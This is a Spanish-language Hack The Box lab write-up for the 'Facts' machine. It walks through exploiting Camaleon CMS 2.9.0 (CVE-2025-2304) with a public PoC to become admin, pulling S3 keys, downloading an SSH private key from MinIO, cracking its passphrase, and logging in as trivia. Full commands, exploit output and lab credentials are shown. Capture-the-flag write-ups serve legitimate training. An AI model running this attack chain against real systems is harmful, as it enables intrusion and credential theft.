# Facts — HTB (Writeup)

> **Autor:** Ángel de la Vega Cuevas
> **Objetivo:** Documentar el proceso de acceso y escalada de privilegios en la máquina *Facts* (HTB/lab) para laboratorio o repositorio personal.

---

## Resumen

Se enumeró un portal web con el CMS **Camaleon 2.9.0**, vulnerable a escalada de privilegios autenticada (**CVE-2025-2304**). La explotación permitió extraer credenciales de **AWS S3**, desde donde se recuperó una clave privada SSH protegida por contraseña. Tras crackearla se accedió al sistema como `trivia` y se obtuvo la flag de usuario desde el directorio de `william`.

---

## 1) Descubrimiento

* **IP objetivo (lab):** `10.129.5.85` / `facts.htb`
* **OS detectado:** Linux (TTL=63)
* **Servicios detectados:** SSH (22/tcp), HTTP (80/tcp), servicio desconocido (54321/tcp)

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.5.85 -oG Facts
```

---

## 2) Enumeración web

El portal en `http://facts.htb` es un blog tipo WordPress. Con **Wappalyzer** se identifica **Nginx 1.26.3**.

Enumeración de directorios:

```bash
gobuster dir -u http://facts.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Resultado relevante:

```
/admin    → redirige a http://facts.htb/admin/login
```

Accediendo a `/admin/login` se crea un usuario. El pie de página revela el CMS: **Camaleon CMS versión 2.9.0**.

---

## 3) Explotación (CVE-2025-2304)

### Descripción de la vulnerabilidad

**CVE-2025-2304** afecta a Camaleon CMS 2.9.0 y permite a un usuario autenticado con rol `client` escalar sus privilegios a `admin` mediante una petición manipulada a la API de gestión de usuarios. Además, la versión vulnerable expone credenciales de almacenamiento S3 a través del panel de administración.

PoC utilizado:

```
https://github.com/Alien0ne/CVE-2025-2304
```

Preparación del entorno:

```bash
python3 -m venv venv
source venv/bin/activate
pip install requests
```

Ejecución del exploit con el usuario creado previamente:

```bash
python3 exploit.py -u http://facts.htb -U adios -P adios --newpass adios -e -r
```

Salida obtenida:

```
[+] Camaleon CMS Version 2.9.0 PRIVILEGE ESCALATION (Authenticated)
[+] Login confirmed
   User ID: 6
   Current User Role: client
[+] Loading PRIVILEGE ESCALATION
   User ID: 6
   Updated User Role: admin
[+] Extracting S3 Credentials
   s3 access key: AKIA1789727493EEDD14
   s3 secret key: I58v3i7ZNwu68TTspQV7RdC7sE+9YQZ6PzV5Kfdv
   s3 endpoint: http://localhost:54321
[+] Reverting User Role
   User ID: 6
   User Role: client
```

Se obtienen credenciales de **AWS S3** y se identifica que el servicio corre en el puerto `54321`.

---

## 4) Acceso a AWS S3

Configuración del cliente AWS con las credenciales obtenidas:

```bash
aws configure
# Access Key: AKIA1789727493EEDD14
# Secret Key: I58v3i7ZNwu68TTspQV7RdC7sE+9YQZ6PzV5Kfdv
# Region: US
# Output: json
```

Listado de buckets disponibles:

```bash
aws --endpoint-url http://facts.htb:54321 s3 ls
```

```
2025-09-11 08:06:52 internal
2025-09-11 08:06:52 randomfacts
```

El bucket `randomfacts` contiene las entradas del blog. El interesante es `internal`:

```bash
aws --endpoint-url http://facts.htb:54321 s3 ls s3://internal/
```

```
PRE .bundle/
PRE .cache/
PRE .ssh/
    .bash_logout
    .bashrc
    .lesshst
    .profile
```

Se identifica una carpeta `.ssh`. Se listan y descargan las claves:

```bash
aws --endpoint-url http://facts.htb:54321 s3 ls s3://internal/.ssh/
aws --endpoint-url http://facts.htb:54321 s3 cp s3://internal/.ssh/id_ed25519 ./id_ed25519
```

La clave pública revela el usuario del sistema:

```bash
ssh-keygen -y -f id_ed25519
# ssh-ed25519 AAAAC3NzaC1lZDI1NTE5... trivia@facts.htb
```

---

## 5) Crackeo de la clave privada SSH

La clave privada está protegida por contraseña. Se convierte al formato de John the Ripper:

```bash
python3 /usr/share/john/ssh2john.py id_ed25519 > ssh.hash
john --wordlist=/home/kali/rockyou.txt ssh.hash
```

Contraseña encontrada: **`dragonballz`**

---

## 6) Acceso inicial

```bash
chmod 600 id_ed25519
ssh -i id_ed25519 trivia@facts.htb
# Passphrase: dragonballz
```

La flag de usuario no está en el home de `trivia` sino en el de `william`, accesible directamente:

```bash
cat /home/william/user.txt
# 90b277db59fe62a3bc8f927b3619fa8c
```

---

## 7) Flags

| Flag | Hash |
|------|------|
| `user.txt` | `90b277db59fe62a3bc8f927b3619fa8c` |
| `root.txt` | `[pendiente]` |

---

## 8) Estado actual

| Paso | Estado |
|------|--------|
| Enumerar web y CMS | ✅ |
| Explotar CVE-2025-2304 | ✅ |
| Extraer credenciales S3 | ✅ |
| Recuperar clave SSH desde S3 | ✅ |
| Crackear passphrase SSH | ✅ |
| Acceso SSH como `trivia` / `user.txt` | ✅ |
| Escalada a `root` | ⏳ |

---

## 9) Notas técnicas

- El puerto `54321` corresponde al endpoint de **MinIO** (S3 compatible), no a AWS real — por eso se usa `--endpoint-url`.
- La flag de usuario está en `/home/william/` a pesar de entrar como `trivia` — indica que `trivia` tiene permisos de lectura sobre ese directorio.
- Las credenciales S3 expuestas por el CMS son un hallazgo crítico en entornos reales — equivalen a acceso directo al almacenamiento del servidor.
